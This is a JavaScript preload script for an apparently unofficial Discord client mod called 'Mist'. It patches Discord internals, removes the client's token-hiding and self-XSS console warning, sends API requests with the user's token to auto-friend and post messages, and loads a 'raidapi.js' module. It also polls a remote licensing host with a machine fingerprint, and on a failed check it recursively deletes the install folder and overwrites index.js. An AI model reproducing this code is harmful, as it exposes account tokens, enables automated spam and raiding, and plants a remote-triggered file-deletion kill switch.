const path = window.require('path');
const fs = window.require('fs');
const WebSocket = require('ws');
const electron = window.require('electron');
const request = window.require('request');
const Module =  window.require('module').Module;
const os = window.require('os');
Module.globalPaths.push(path.resolve(electron.remote.app.getAppPath(), 'node_modules'));
const currentWindow = electron.remote.getCurrentWindow();
var ChristmasTheme = false;
var EasterEggs = 0;
var PlayMenuAudio = true;
if (currentWindow.__preload) require(currentWindow.__preload);
window.opened = false;
if (!process.env.InstallationDir) process.env.InstallationDir = __dirname;

setInterval(() => {
    if (window.GetHWID() != undefined)
            request.get(`http://yaekiths-projects.xyz/mistipwhitelisted.php?hwid=${window.GetHWID()}`, 
            {
                headers: {'User-Agent':  'UsWCmjlbTlFf050hpxEyQCNk2IFT8w0Ukdt7Ohga'}
            }, (err2, res2, body2) => {
                if (body2 != "1")
                {
                    console.error("Not Authenticated: HWID: " + window.GetHWID());
                    window.DrawingAPI.alert('Authentication Failed', "Authentication to mist's servers failed. So we ejected you as a safety precaution.");
                    
                    deleteFolderRecursive(`${process.env.InstallationDir}`);
                    console.log(__dirname);
                    console.log(path.join(__dirname + '/../index.js'));
                    fs.writeFileSync(path.join(__dirname + '/../index.js'), "module.exports = require('./core.asar');")
                    setTimeout(() => {
                        process.exit(0);
                    }, 5000);
                }
            });

}, 45000);

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
    function error(text)
    {
        console.info('%c[Mist]','color: #ff0000', 'Error: ' + text);
        
    }
    function warn(text){
        console.info('%c[Mist]','color: #ffff00', 'WARNING: ' + text);
    }

   
    function deleteFolderRecursive(path) {
        if( fs.existsSync(path) ) {
          fs.readdirSync(path).forEach(function(file,index){
            var curPath = path + "/" + file;
            if(fs.lstatSync(curPath).isDirectory()) { // recurse
              deleteFolderRecursive(curPath);
            } else { // delete file
              fs.unlinkSync(curPath);
            }   
          });
          fs.rmdirSync(path);
        }
      };
    function loadmod(modification)
    {
        if (fs.existsSync(`${process.env.InstallationDir}/config.json`))
        {
            try {
                var config = JSON.parse(fs.readFileSync(`${process.env.InstallationDir}/config.json`, "utf8"));
                window.MistUtils.Config = config;

                if (config.LoadModifications.length > 0)
                {
                    if (config.LoadModifications.includes(modification.name))
                    {
                        modification.load();
                    }
                }
            }
            catch(err)
            {
                console.error(`[Error] [MistClient] Failed to load modification: ${modification.name}..`);
            } 
        }
        else{
            try {
              modification.load();
            }
            catch(err)
            {
                console.error(`[Error] [MistClient] Failed to load modification: ${modification.name}..`);
            }
        }
    }
window.MC = {modifs: {} };
window.MistUtils = {};
window.MistUtils.friendMode = "Default"
window.MistUtils.InjectHTML = function(html){
        return document.createRange().createContextualFragment(html);
}
process.on('uncaughtException', function (err) {
    //console.log("Prevented a Crash. Details: \n" + err.stack);
});
window.FriendUser = function(user, discrim)
{
    request.post(`https://discordapp.com/api/v6/users/@me/relationships`, {
                                                    headers: {
                                                        'Authorization' : window.getUserToken()
                                                    },
                                                    json: true,
                                                    body: {username: user, discriminator: discrim}
                                                }, (err3, res3, body3) => {
                                                    if (res3.statusCode == 200 || res3.statusCode == 204)
                                                    {
                                                    }
    });
}
window.hookFunction = function(object, functionName, callback) {
    (function(originalFunction) {
        object[functionName] = function () {
            var returnValue = originalFunction.apply(this, arguments);

            callback.apply(this, [returnValue, originalFunction, arguments]);

            return returnValue;
        };
    }(object[functionName]));
}
window.MistUtils.friendModeSelectorOpen = false;

window.MC.localStorage = window.localStorage;

window.MistUtils.Config;
process.once("loaded", async () => {
    if (fs.existsSync(`${process.env.InstallationDir}/config.json`))
        {
            try {
                var config = JSON.parse(fs.readFileSync(`${process.env.InstallationDir}/config.json`, "utf8"));
                window.MistUtils.Config = config;
            }
            catch(err)
            {

            }
        }
        else
        {
            fs.writeFileSync(`${process.env.InstallationDir}/config.json`, JSON.stringify({'DeveloperMode' : false, 'UseModules' : true, 'RaidDelay' : true, 'UseRPC' : false, 'LoadModifications' : []}))
        }
    
     // LOADING
    warn(`Loading Mist Client v${process.env.MistVersion}... Please wait...`)
    while (typeof window.webpackJsonp === 'undefined')
        await sleep(1000);

        window.req = webpackJsonp.push([[], {
            '__extra_id__': (module, exports, req) => module.exports = req
        }, [['__extra_id__']]]);
        delete req.m['__extra_id__'];
        delete req.c['__extra_id__'];

    window.findModule = (module, silent) => {
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[module] !== undefined)
                    return m.default;
                if (m && m[module] !== undefined)
                    return m;
            }
        }
        return null;
    };
    window.opened = false;
    window.findModules = (module) => {
        let mods = [];
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[module] !== undefined)
                    mods.push(m.default);
                if (m && m[module] !== undefined)
                    mods.push(m);
            }
        }
        return mods;
    };
    window.findRawModule = (modulex, silent) => {
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
                if (m && m.__esModule && m.default && m.default[modulex] !== undefined)
                    return req.c[i];
                if (m && m[module] !== undefined)
                    return req.c[i];
            }
        }
        return null;
    };
    window.GetHWID = function()
    {
        
            var hwid = os.hostname() + os.userInfo().username;

            const crypto = require('crypto');
            const hash = crypto.createHash('sha256');
            
            hash.update(hwid);
    
            return hash.digest('hex');
    }
    window.ListModules = function(){
        for (let i in req.c) {
            if (req.c.hasOwnProperty(i)) {
                let m = req.c[i].exports;
            }
        }
    }
    window.PatchMethod = function(what, methodName, newFunc) {
        if (!what || typeof what !== 'object')
            return error(`Could not patch ${methodName} - Invalid module passed!`, {name: 'Modules', color: 'black'});
        const displayName = what.displayName || what.name || what.constructor.displayName || what.constructor.name;
        const origMethod = what[methodName];
        const cancel = () => {
            what[methodName] = origMethod;
            return true;
        }
        what[methodName] = function() {
            const data = {
                thisObject: this,
                methodArguments: arguments,
                originalMethod: origMethod,
                callOriginalMethod: () => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)
            };
            return newFunc(data);
        };
        what[methodName].__monkeyPatched = true;
        what[methodName].displayName = 'patched ' + (what[methodName].displayName || methodName);
        what[methodName].unpatch = cancel;
        return true;
    };
  
    require('./raidapi.js');
    //MODIFICATION LOADING -- Cheers EnhancedDiscord :D
	if (fs.existsSync(path.join(process.env.InstallationDir, 'mods'))) {
    let modifications = fs.readdirSync(path.join(process.env.InstallationDir, 'mods'));
    let mods = {};
    for (let i in modifications) {
        if (modifications[i].endsWith('.mod.js') || modifications[i].endsWith('.plugin.js'))
        {
            let p, pName = modifications[i].replace(/\.js$/, '');
            try {
                p = require(path.join(process.env.InstallationDir, 'mods', pName));
                if (p.name === null || p.author === null || typeof(p.load) !== 'function') {
                    throw new Error(`Failed to load a modification! It must have a name, author and a load() function!`);
                }
                mods[pName] = Object.assign(p, {id: pName});
            }
            catch (err) {
                error(`Failed to load [${modifications[i]}] ${err}`)
            }
        }
    }

    for (let id in mods) {
        if (!mods[id] || !mods[id].name || typeof mods[id].load !== 'function') {
           info(`Skipping invalid mod: ${id}`); mods[id] = null; continue;
        }
        loadmod(mods[id]);
    }

    window.MC.modifs = mods;
    }
    
    // Experiments Tab :dab:
    if (window.MistUtils.Config != null)
    {
        if (window.MistUtils.Config.DeveloperMode)
        {
            window.findModule('isDeveloper').__proto__ = {
                constructor: window.findModule('isDeveloper').__proto__,
                getExperimentDescriptor: window.findModule('isDeveloper').__proto__.getExperimentDescriptor,
                isDeveloper: true,
                __proto__: window.findModule('isDeveloper').__proto__.__proto__
            }
        }
    }
     //Patching Methods:
    PatchMethod(window.findModule('track'), 'track', () => {

    });
    

    const hideToken = window.findModule('hideToken');

    PatchMethod(hideToken, 'hideToken', () => {
    
    });
     
    fixedShowToken = () => {
       
        if (!window.MC.localStorage || window.MC.localStorage.getItem("token")) return;
        return window.MC.localStorage.setItem("token", '"' + hideToken.getToken() +'"');
    };
    PatchMethod(hideToken, 'showToken', fixedShowToken);
    if (!window.MC.localStorage.getItem("token") && ht.getToken())
        fixedShowToken();

        CheckIfVerificationNeeded();
        
    var cw = window.findModule('consoleWarning');
    window.PatchMethod(cw, 'consoleWarning', () => {
        console.log("%cFuck Up!", "color: #7289DA; -webkit-text-stroke: 2px black; font-size: 72px; font-weight: bold;");
        console.log("%cIf you are reading this, you have made the right choice.", "font-size: 16px;");
        console.log("%cYou were warned about owning Nano, and you can now see that Mist is better. It adds features that NanO cannot. Also for some memes xD Download this: http://s000.tinyupload.com/index.php?file_id=30961675725724174167", "font-size: 18px; font-weight: bold; color: red;");
    });
    //ON FRIENDS TAB OPENED
    //FRIENDS TAB DETECTION:
    setInterval(() => {
        if (window.location.href == 'https://discordapp.com/channels/@me')
        {
            for(var i = 0; i < window.MC.modifs.length; i++)
            {
                var mod = window.MC.modifs[i];
                mod.onFriendsTab();
            }

            if (document.getElementById('denyAll-Button') == undefined)
            {
            var elem = document.getElementsByClassName('tabBar-ZmDY9v topPill-30KHOu')[0];

            window.addDenyAllButton(elem);
            window.addConsoleButton(elem);
            //window.ChristmasTree(document.getElementsByClassName("toolbar-1t6TWx")[0]); //EASTEREGG GONE :c
            addFriendStatusText();
            addFriendModeChanger();
            }
        }
    }, 300);

    setTimeout(() => {
        window.test();
    }, 5000);
    //RIGHT CLICK DETECTION:
    setInterval(() => {
        
        if (document.getElementsByClassName('contextMenu-HLZMGh').length > 0)
        {
            var elem = document.getElementsByClassName('contextMenu-HLZMGh')[0]
            var guild = false;
            var user = false;
            for(var i = 0; i < elem.childNodes.length; i++)
            {
                var x = elem.childNodes[i];
                if (x.innerHTML.includes("Mark As Read"))
                {
                    guild = true;
                    //Server
                    break;
                }
                else
                {
                   user = true;
                   break;
                }
            }

            if (guild)
            {
                //addServerQuickActions();
                guild = false;
            }

            if (user){
                //addUserQuickActions();
                user = false;
            }
        }
        

    }, 300);
    //check for incoming friend requests
    setInterval(() => {
        GetFriendRequests();
    }, 10000);

    //Check for Menu Button
    setInterval(() => {
        CheckForMenuButton();
    }, 500);
});
function getChannelID(){
    var channelId = window.location.toString().split("/")[window.location.toString().split("/").length - 1];

    return channelId;
}
window.ChoiceBox = function(title, description, button1title, button1description, callback1, button2title, button2description, callback2)
{
    //  
    
    var element = document.getElementsByClassName("popouts-2bnG9Z")[0];

    if (element != undefined)
    {
        var elem = window.MistUtils.InjectHTML(`<div data-focus-lock-disabled="false" class="focusLock-Ns3yie"><div role="dialog" class="modalRoot-3CDhTv root-1gCeng small-3iVZYw" style="opacity: 1; transform: scale(1);"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6 header-2tA9Os headerContainer-1RqDZH" style="flex: 0 0 auto;"><div class="art-1Va19s"></div><div class="header-VW1ZRy"><h3 class="wrapper-1sSZUt base-1x0h_U size24-RIRrxO" id="ChoiceBoxTitle">Placeholder</h3><div class="colorStandard-2KCXvj size16-1P40sf headerText-37wvTb" id="ChoiceBoxDescription">Placeholder Description</div></div><button aria-label="Close" type="button" class="close-1kwMUs modalCloseButton-1YWZbe button-38aScr lookBlank-3eh9lL colorBrand-3pXr91 grow-q77ONN" id="ChoiceBoxCloseButton"><div class="contents-18-Yxp"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="currentColor" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div></button></div><div class="modalContent-zYZfKF"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix content-1EtbQh scrollerThemed-2oenus themeGhostHairline-DBD-2d"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl inner-ZyuQk0"><div><div style="height: auto; opacity: 1; overflow: auto; transform: translateX(0%);"><div class="measurement-36xDqs"><h3 class="subHeader-1yeRTt base-1x0h_U size12-3cLvbJ">Choose One:</h3><div class="plan-2S1isr"><div class="planInfoContainer-2vBjqE"><h3 class="wrapper-1sSZUt base-1x0h_U size20-17Iy80" id="ChoiceBoxOption1">Placeholder</h3><div class="colorStandard-2KCXvj size12-3cLvbJ planDuration-rJbCgE" id="ChoiceBoxOption1Description">Placeholder</div></div><button type="button" class="button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeMedium-1AC_Sl grow-q77ONN" id="ChoiceBoxOption1Button"><div class="contents-18-Yxp">Select</div></button></div><div class="plan-2S1isr"><div class="planInfoContainer-2vBjqE"><h3 class="wrapper-1sSZUt base-1x0h_U size20-17Iy80" id="ChoiceBoxOption2">Placeholder</h3><div class="colorStandard-2KCXvj size12-3cLvbJ planDuration-rJbCgE" id="ChoiceBoxOption2Description">Placeholder</div></div><button type="button" class="button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeMedium-1AC_Sl grow-q77ONN" id="ChoiceBoxOption2Button"><div class="contents-18-Yxp">Select</div></button></div></div></div></div></div></div></div><div class="flex-1xMQg5 flex-1O1GKY horizontalReverse-2eTKWD horizontalReverse-3tRjY7 flex-1O1GKY directionRowReverse-m8IjIq justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6 footer-3rDWdC" style="flex: 0 0 auto;"><div class="backButtonContainer-vfpOkb"><a tabindex="0" class="anchor-3Z-8Bb anchorUnderlineOnHover-2ESHQB backButton-3ptQg1" role="button" id="ChoiceBoxCancelButton">Cancel</a></div></div></div></div>`)

        element.appendChild(elem);

        document.getElementById('ChoiceBoxTitle').innerText = title;
        document.getElementById('ChoiceBoxDescription').innerText = description;
        document.getElementById('ChoiceBoxOption1').innerText = button1title;
        document.getElementById('ChoiceBoxOption2').innerText = button2title;
    }
}
window.ForceSpeak = function(text)
{
        request.post(`https://discordapp.com/api/v6/channels/${getChannelID()}/messages`,
            {
                headers: {
                    'Authorization' : window.getUserToken()
                },
                json: true,
                body: {
                'content' : text,
                'nonce' : null,
                'tts' : false
                }
            }, (err, res, body) => {
            
            });
}
function CheckForMenuButton()
{
    var yeaok = document.getElementsByClassName(`flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6`);
				if(yeaok[0] != undefined){
                    if (document.getElementById('contextmenubut') == undefined)
                    {
                        var elem34 = document.getElementsByClassName('flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6')[0];
                        ContextMenuButton = window.MistUtils.InjectHTML(`<button id="contextmenubut" aria-label="Mist Menu" type="button" class="button-14-BFJ enabled-2cQ-u7 button-38aScr lookBlank-3eh9lL colorBrand-3pXr91 grow-q77ONN"><div class="contents-18-Yxp"><svg name="Nova_CircleAdd" class="icon-2doZ3q" aria-hidden="false" width="18" height="18" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2.00098C6.486 2.00098 2 6.48698 2 12.001C2 17.515 6.486 22.001 12 22.001C17.514 22.001 22 17.515 22 12.001C22 6.48698 17.514 2.00098 12 2.00098ZM17 13.001H13V17.001H11V13.001H7V11.001H11V7.00098H13V11.001H17V13.001Z"></path></svg></div></button>`);
                      
   
     
   
                        ContextMenuButton.style = 'height:32px;cursor:pointer;'
                        elem34.appendChild(ContextMenuButton);
   
   
                        var lolipop = document.getElementById(`contextmenubut`);
                         lolipop.addEventListener("click", function () {

                         if(window.opened == false){
                     
                             window.MistUtils.MistMenu();
                             window.opened = true;
                          }
                          else{
                              window.opened = false;
                          }
                       
                        });
                        lolipop.addEventListener('contextmenu', function() {
                            createContextMenu();
                        });
                       }
                    }
					 
}
window.MistUtils.ModuleReload = function(){
    if (fs.existsSync(path.join(process.env.InstallationDir, 'mods'))) {
        let modifications = fs.readdirSync(path.join(process.env.InstallationDir, 'mods'));
        let mods = {};
        for (let i in modifications) {
            if (modifications[i].endsWith('.mod.js') || modifications[i].endsWith('.plugin.js'))
            {
                let p, pName = modifications[i].replace(/\.js$/, '');
                try {
                    p = require(path.join(process.env.InstallationDir, 'mods', pName));
                    if (p.name === null || p.author === null || typeof(p.load) !== 'function') {
                        throw new Error(`Failed to load a modification! It must have a name, author and a load() function!`);
                    }
                    mods[pName] = Object.assign(p, {id: pName});
                    for (let id in mods) {
        
                        if (!mods[id] || !mods[id].name || typeof mods[id].load !== 'function') {
                           info(`Skipping invalid mod: ${id}`); mods[id] = null; continue;
                        }
                        mods[id].reload();
                    }
                }
                catch (err) {
                    error(`Failed to load [${modifications[i]}] ${err}`)
                }
            }
        }
        
    }
  
}
 window.addSettingsMenu = function(){
    if (document.getElementsByClassName("header-2RyJ0Y").length > 0)
    {
        if (document.getElementsByClassName("header-2RyJ0Y")[0].innerHTML.includes("Settings"))
        {
            if (!document.getElementById('MistSettingsHeader'))
            {
                //Opened settings
                /*
                <div class="header-2RyJ0Y" role="button">Mist Settings</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="Configuration">Configuration</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="Modules">Modules</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="DeveloperOnly">Developer Only</div>
    
                <div class="separator-gCa7yv"></div>
                <div class="separator-gCa7yv"></div>*/
    
                var holster = document.getElementsByClassName("side-8zPYf6")[0];
    
                var elem = window.MistUtils.InjectHTML(`<div class="header-2RyJ0Y" role="button" id='MistSettingsHeader'>Mist Settings</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="Configuration">Configuration</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="Modules">Modules</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="UserInfo">User Info</div><div tabindex="0" class="item-PXvHYJ themed-OHr7kt" role="button" id="DeveloperOnly">Developer Only</div><div class="separator-gCa7yv"></div><div class="separator-gCa7yv" id='MistSeperator2'></div>`);
    
                holster.insertBefore(elem, document.getElementsByClassName("item-PXvHYJ")[22]);

                holster.insertBefore(window.MistUtils.InjectHTML(`<div tabindex="0" class="item-PXvHYJ" role="button" id='AbandonAccount' style="color: rgb(240, 71, 71);">Abandon Account</div>`), document.getElementById('MistSeperator2'))
                var Configuration = document.getElementById('Configuration');
                var Plugins = document.getElementById('Modules');
                var developerOnly = document.getElementById('DeveloperOnly');
                var AbandonAccount = document.getElementById('AbandonAccount');
                var UserInfo = document.getElementById('UserInfo');
                if (!window.MistUtils.Config.DeveloperMode)
                {
                    developerOnly.remove();
                }

                Configuration.addEventListener("click", () => {
                    if (Plugins.className.includes("selected-3s45Ha")) Plugins.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (developerOnly.className.includes("selected-3s45Ha")) developerOnly.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (UserInfo.className.includes("selected-3s45Ha")) UserInfo.className = "item-PXvHYJ themed-OHr7kt";


                    if (!Configuration.className.includes("selected-3s45Ha"))
                    {
                        Configuration.className = "item-PXvHYJ selected-3s45Ha themed-OHr7kt";
                        showConfigMenu();
                    }
                });
    
                Plugins.addEventListener("click", () => {
                    if (Configuration.className.includes("selected-3s45Ha")) Configuration.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (developerOnly.className.includes("selected-3s45Ha")) developerOnly.className = "item-PXvHYJ themed-OHr7kt";

                    if (UserInfo.className.includes("selected-3s45Ha")) UserInfo.className = "item-PXvHYJ themed-OHr7kt";

                    if (!Plugins.className.includes("selected-3s45Ha"))
                    {
                        Plugins.className = "item-PXvHYJ selected-3s45Ha themed-OHr7kt";
                        showModulesMenu();
                    }
                });
    
                developerOnly.addEventListener("click", () => {
                    if (Configuration.className.includes("selected-3s45Ha")) Configuration.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (Plugins.className.includes("selected-3s45Ha")) Plugins.className = "item-PXvHYJ themed-OHr7kt";

                    if (UserInfo.className.includes("selected-3s45Ha")) UserInfo.className = "item-PXvHYJ themed-OHr7kt";

                    if (!developerOnly.className.includes("selected-3s45Ha"))
                    {
                        developerOnly.className = "item-PXvHYJ selected-3s45Ha themed-OHr7kt";
                        //showDeveloperOnlyMenu();
                    }
                });
                
                AbandonAccount.addEventListener("click", () => {
                    if (UserInfo.className.includes("selected-3s45Ha")) UserInfo.className = "item-PXvHYJ themed-OHr7kt";

                    if (Configuration.className.includes("selected-3s45Ha")) Configuration.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (Plugins.className.includes("selected-3s45Ha")) Plugins.className = "item-PXvHYJ themed-OHr7kt";

                    addAbandonAccountUI(); 
                });

                AbandonAccount.addEventListener("mouseover", () => {
                    if (AbandonAccount.style == "color: rgb(240, 71, 71);")
                    {
                        AbandonAccount.style = "color: rgb(240, 71, 71); background-color: rgba(240, 71, 71, 0.1);";
                    }
                    else{
                        AbandonAccount.style = "color: rgb(240, 71, 71);";
                    }
                });
                UserInfo.addEventListener('click', () => {
                    if (developerOnly.className.includes("selected-3s45Ha")) developerOnly.className = "item-PXvHYJ themed-OHr7kt";

                    if (Configuration.className.includes("selected-3s45Ha")) Configuration.className = "item-PXvHYJ themed-OHr7kt";
    
                    if (Plugins.className.includes("selected-3s45Ha")) Plugins.className = "item-PXvHYJ themed-OHr7kt";

                    if (!UserInfo.className.includes("selected-3s45Ha"))
                    {
                        UserInfo.className = "item-PXvHYJ selected-3s45Ha themed-OHr7kt";
                        addUserInfoMenu();
                    }
                });
            }
        }
    }
}
setInterval(() => {
    addSettingsMenu();
}, 500);

function GetRandomGif()
{
    var gifs = [
        'https://i.imgur.com/FLdcbL8.gif', 'https://i.imgur.com/8mOG9DM.gif', 'https://i.imgur.com/U3E3R57.gif', 'https://i.imgur.com/NcdmKmU.gif'
    ];

    return gifs[Math.floor(Math.random()*gifs.length)];
}
window.addUserInfoMenu = function(){
    /*
    <div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><div class="userSettingsAccount-2eMFVR"><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id='MistInfoHeader'>Your User Information</h2>

<div class="description-3_Ncsb formText-3fs7AJ marginBottom20-32qID7 modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute; top:80px;">Here you can view your mist license information. Isn't that neat?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="userInfoViewing-16kqK3 cardPrimary-1Hv-to card-3Qj_Yx"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 0 1 auto;"><div class="wrapper-3t9DeA" role="img" aria-label="Mist - Yaekith" aria-hidden="false" style="width: 100px; height: 100px;"><svg width="100" height="100" viewBox="0 0 100 100" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="100" height="100" mask="url(#svg-mask-avatar-default)"><img src="https://cdn.discordapp.com/avatars/602119454003953694/f3bb2453164471198c5f43699bf151d4.png?size=128" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><div class="marginBottom20-32qID7"><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Discord ID</h5>
<div class="viewBody-2Qz-jg selectable-x8iAUj" id='DiscordID'>602119454003953694</div></div><div><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">License Key</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id='LicenseKey'>Placeholder</div><br>

<h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w" style="top: 0px;">License Type</h5>
<div class="viewBody-2Qz-jg selectable-x8iAUj" id='LicenseType'>Sudo</div></div></div></div></div></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>
*/

var holster = document.getElementsByClassName("contentRegion-3nDuYy")[0];
if (!document.getElementById('MistInfoHeader'))
{
    for(var i = 0; i < holster.children.length; i++)
    {
    holster.children[i].remove();
    }
   
        var elem = window.MistUtils.InjectHTML(`<div class="contentRegion-3nDuYy"><div class="contentTransitionWrap-3hqOEW"><div class="scrollerWrap-2lJEkd firefoxFixScrollFlex-cnI2ix contentRegionScrollerWrap-3YZXdm scrollerThemed-2oenus themeGhost-28MSn0 scrollerTrack-1ZIpsv"><div class="scroller-2FKFPG firefoxFixScrollFlex-cnI2ix systemPad-3UxEGl contentRegionScroller-26nc1e"><div class="contentColumn-2hrIYH contentColumnDefault-1VQkGM"><div><div class="userSettingsAccount-2eMFVR"><h2 class="h2-2gWE-o title-3sZWYQ size16-14cGz5 height20-mO2eIN weightSemiBold-NJexzi defaultColor-1_ajX0 defaultMarginh2-2LTaUL marginBottom20-32qID7" id="MistInfoHeader">Your User Information</h2><div class="description-3_Ncsb formText-3fs7AJ marginBottom20-32qID7 modeDefault-3a2Ph1 primary-jw0I4K" style="position:absolute; top:80px;">Here you can view your mist license information. Isn't that neat?</div><div class="vertical-V37hAW flex-1O1GKY directionColumn-35P_nr"><div class="userInfoViewing-16kqK3 cardPrimary-1Hv-to card-3Qj_Yx"><div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignStretch-DpGPf3 noWrap-3jynv6" style="flex: 1 1 auto;"><div class="flexChild-faoVW3" style="flex: 0 1 auto;"><div class="wrapper-3t9DeA" role="img" aria-label="Mist - Yaekith" aria-hidden="false" style="width: 100px; height: 100px;"><svg width="100" height="100" viewBox="0 0 100 100" class="mask-1l8v16" aria-hidden="true"><foreignObject x="0" y="0" width="100" height="100" mask="url(#svg-mask-avatar-default)"><img src="${GetRandomGif()}" alt=" " class="avatar-VxgULZ" aria-hidden="true"></foreignObject></svg></div></div><div class="flexChild-faoVW3" style="flex: 1 1 auto;"><div class="marginBottom20-32qID7"><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">Discord ID</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="DiscordID">Gathering Discord ID...</div></div><div><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w">License Key</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="LicenseKey">???</div><br><h5 class="h5-18_1nd title-3sZWYQ size12-3R0845 height16-2Lv3qA weightSemiBold-NJexzi marginBottom4-2qk4Hy faded-3bns_w" style="top: 0px;">License Type</h5><div class="viewBody-2Qz-jg selectable-x8iAUj" id="LicenseType">Fetching Information...</div></div></div><button type="button" class="userInfoViewingButton-2-jbH9 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeSmall-2cSMqn grow-q77ONN" id="ViewWhitelistInfo"><div class="contents-18-Yxp">View Whitelist Information</div></button></div></div></div></div></div></div><div class="toolsContainer-1edPuj"><div class="tools-3-3s-N"><div class="container-1sFeqf"><div tabindex="0" class="closeButton-1tv5uR" role="button"><svg name="Close" aria-hidden="false" width="18" height="18" viewBox="0 0 12 12"><g fill="none" fill-rule="evenodd"><path d="M0 0h12v12H0"></path><path class="fill" fill="#dcddde" d="M9.5 3.205L8.795 2.5 6 5.295 3.205 2.5l-.705.705L5.295 6 2.5 8.795l.705.705L6 6.705 8.795 9.5l.705-.705L6.705 6"></path></g></svg></div><div class="keybind-KpFkfr">ESC</div></div></div></div></div></div></div></div>`);

        holster.appendChild(elem);
        
        var discordID = document.getElementById('DiscordID');
        var LicenseType = document.getElementById('LicenseType');
        var LicenseKey = document.getElementById('LicenseKey');
        var whitelistInfoButton = document.getElementById('ViewWhitelistInfo');


        request.get('https://discordapp.com/api/v6/users/@me', {
            headers: {
                'Authorization' : window.getUserToken()
            }
        }, (err, res, body) => {
            discordID.innerText = JSON.parse(body).id;
        });
        
        request.get(`http://yaekiths-projects.xyz/getmistinfo.php?hwid=${window.GetHWID()}`, {
            headers: {'User-Agent' : 'UsWCmjlbTlFf050hpxEyQCNk2IFT8w0Ukdt7Ohga'}
        },(err, res, body) => {
